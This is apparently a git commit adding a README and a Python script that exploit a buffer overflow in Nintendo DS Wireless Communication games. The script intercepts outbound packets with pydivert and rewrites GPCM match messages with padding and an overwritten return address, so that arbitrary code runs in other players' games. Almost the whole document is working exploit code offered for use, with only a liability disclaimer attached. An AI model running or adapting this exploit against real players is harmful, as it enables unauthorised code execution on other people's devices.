55dbeaa0d8f70870bad6b279377d708abe915715
MikeIsAStar <99037623+MikeIsAStar@users.noreply.github.com>
2023-10-11 00:12:00 -0400

    Initial commit

---
+++ README.md
@@ -0,0 +1,14 @@
+# DS Wireless Communication Remote Code Execution
+
+Injects arbitrary code into a client's game.
+
+## Prerequisites
+- pydivert
+
+## Usage
+```cmd
+python ds_wireless_communication_remote_code_execution.py
+```
+
+## License
+[GNU General Public License v2.0](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
---
+++ ds_wireless_communication_remote_code_execution.py
@@ -0,0 +1,57 @@
+"""This code will inject arbitrary code into a client's game.
+
+You are fully responsible for all activity that occurs while using this code.
+The author of this code can not be held liable to you or to anyone else as a
+result of damages caused by the usage of this code.
+"""
+
+__author__ = 'MikeIsAStar'
+__date__ = '11 Oct 2023'
+
+import pydivert
+import re
+
+# Variables
+LR_SAVE = b'\x41\x41\x41\x41'
+assert len(LR_SAVE) == 0x04
+PADDING = b'MikeStar'
+assert len(PADDING) > 0x00
+
+# Constants
+DWC_MATCH_COMMAND_INVALID = b'\xFE'
+PADDING_LENGTH = 0x23C
+FINAL_KEY = b'\\final\\'
+WINDIVERT_FILTER = 'outbound and tcp and tcp.PayloadLength > 0'
+
+
+def try_modify_payload(payload):
+    message_pattern = rb'\\msg\\GPCM([1-9][0-9]?)vMAT'
+    message = re.search(message_pattern, payload)
+    if not message:
+        return None
+
+    payload = payload[:message.end()]
+    payload += DWC_MATCH_COMMAND_INVALID
+    payload += (PADDING * (PADDING_LENGTH // len(PADDING) + 1))[:PADDING_LENGTH]
+    payload += LR_SAVE
+    payload += FINAL_KEY
+    return payload
+
+
+def main():
+    try:
+        with pydivert.WinDivert(WINDIVERT_FILTER) as packet_buffer:
+            for packet in packet_buffer:
+                payload = try_modify_payload(packet.payload)
+                if payload is not None:
+                    print('Modified a GPCM message !')
+                    packet.payload = payload
+                packet_buffer.send(packet)
+    except KeyboardInterrupt:
+        pass
+    except PermissionError:
+        print('This program must be run with administrator privileges !')
+
+
+if __name__ == '__main__':
+    main()
